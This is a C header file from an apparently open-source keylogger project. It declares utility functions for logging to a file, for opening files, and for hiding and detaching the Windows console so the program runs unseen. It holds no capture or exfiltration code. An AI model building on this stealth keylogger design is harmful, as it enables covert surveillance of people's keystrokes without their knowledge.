/* This file is part of bb-keylogger project.
*
* See the NOTICE file distributed with this work for copyright information.
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
* http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*/

/*
* File:   bb-keylogger.h
* Author: Frapin Kevin
* Date:   23/03/2011
*
* DESCRIPTION
* -----------------------------------------------------------------------------
* File containing all thedeclarations of the  utils functions used by the 
* program.
* -----------------------------------------------------------------------------
*/

#ifndef BB_KEYLOGGER_H
#define BB_KEYLOGGER_H

//------------------------------------------------------------- INCLUDES SYSTEM
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>


//------------------------------------------------------------------- FUNCTIONS

/*
* Function that initializes the program :
*  - hides the Windows console
*  - detaches the program from the console
*/
void initialize_program( void );

/*
* Function that log informations passed through unamed parameters.
* The informations are saved in the log file in the specified format.
*/
void log_infos( FILE * log_file, const char * format, ... );

/*
* Function that opens a file a checks if the opening succeeded :
*  - if the opening failed, the programm is killed
*  - if the opening succeeded, the file pointer is returned
*/
FILE * open_file( char * file_name );

#endif /* BB_KEYLOGGER_H */